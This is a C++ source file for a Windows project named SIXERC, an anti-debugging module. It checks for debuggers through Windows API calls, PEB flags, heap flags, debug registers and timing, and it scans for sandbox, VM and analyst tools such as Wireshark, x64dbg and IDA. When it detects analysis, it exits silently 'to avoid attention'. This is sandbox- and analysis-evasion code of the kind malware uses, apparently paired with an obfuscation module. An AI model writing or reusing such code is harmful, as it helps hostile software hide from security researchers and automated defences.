// ============================================================================
// SIXERC — Anti-Debug Implementation
// ============================================================================

#include "anti/antidebug.hpp"
#include "core/obfuscation.hpp"
#include <vector>
#include <thread>
#include <chrono>
#include <tlhelp32.h>
#include <winternl.h>

namespace sixerc::anti {

// NtQueryInformationProcess prototype
typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);

bool is_debugger_present() {
    return IsDebuggerPresent() != 0;
}

bool check_remote_debugger() {
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    return debugged != 0;
}

bool check_nt_global_flag() {
    // Check NtGlobalFlag in PEB
#ifdef _WIN64
    auto peb = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
    uint32_t nt_global_flag = *reinterpret_cast<uint32_t*>(peb + 0xBC);
#else
    auto peb = reinterpret_cast<uint8_t*>(__readfsdword(0x30));
    uint32_t nt_global_flag = *reinterpret_cast<uint32_t*>(peb + 0x68);
#endif
    return (nt_global_flag & 0x70) != 0; // FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
}

bool check_heap_flags() {
    // Check heap flags for debugging markers
#ifdef _WIN64
    auto peb = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
    auto heap = reinterpret_cast<uintptr_t*>(*reinterpret_cast<uintptr_t*>(peb + 0x30));
    uint32_t flags = *reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(heap) + 0x70);
    uint32_t force_flags = *reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(heap) + 0x74);
#else
    auto peb = reinterpret_cast<uint8_t*>(__readfsdword(0x30));
    auto heap = reinterpret_cast<uintptr_t*>(*reinterpret_cast<uintptr_t*>(peb + 0x18));
    uint32_t flags = *reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(heap) + 0x40);
    uint32_t force_flags = *reinterpret_cast<uint32_t*>(reinterpret_cast<uint8_t*>(heap) + 0x44);
#endif
    return (flags & 0x50000062) != 0 || force_flags != 0;
}

bool check_debug_registers() {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (!GetThreadContext(GetCurrentThread(), &ctx)) return false;
    return (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0);
}

bool timing_check() {
    auto start = std::chrono::high_resolution_clock::now();
    
    // Do some work
    volatile uint64_t dummy = 0;
    for (int i = 0; i < 1000000; ++i) {
        dummy += i;
    }
    (void)dummy;
    
    auto end = std::chrono::high_resolution_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();
    
    // If it took way too long, we're probably being single-stepped
    return elapsed > 5000;
}

bool check_sandbox_processes() {
    std::vector<std::wstring> sandbox_procs = {
        L"vmsrvc.exe", L"vmusrvc.exe", L"vboxtray.exe", L"vmtoolsd.exe",
        L"df5serv.exe", L"vboxservice.exe", L"wireshark.exe", L"procmon.exe",
        L"processhacker.exe", L"x32dbg.exe", L"x64dbg.exe", L"ollydbg.exe",
        L"idaq.exe", L"ida64.exe", L"ida.exe", L"httpdebugger.exe",
        L"fiddler.exe", L"fakenet.exe", L"netmon.exe", L"autoruns.exe"
    };
    
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;
    
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    bool found = false;
    
    if (Process32FirstW(hSnap, &pe)) {
        do {
            for (const auto& name : sandbox_procs) {
                if (_wcsicmp(pe.szExeFile, name.c_str()) == 0) {
                    found = true;
                    break;
                }
            }
        } while (!found && Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

bool check_vm_artifacts() {
    // Check for common VM MAC prefixes
    // Simplified check — can be expanded
    return false;
}

bool is_being_analyzed() {
    return is_debugger_present() ||
           check_remote_debugger() ||
           check_nt_global_flag() ||
           check_heap_flags() ||
           check_debug_registers() ||
           timing_check() ||
           check_sandbox_processes();
}

void evade_if_detected() {
    if (is_being_analyzed()) {
        // Exit cleanly without error to avoid attention
        ExitProcess(0);
    }
}

} // namespace sixerc::anti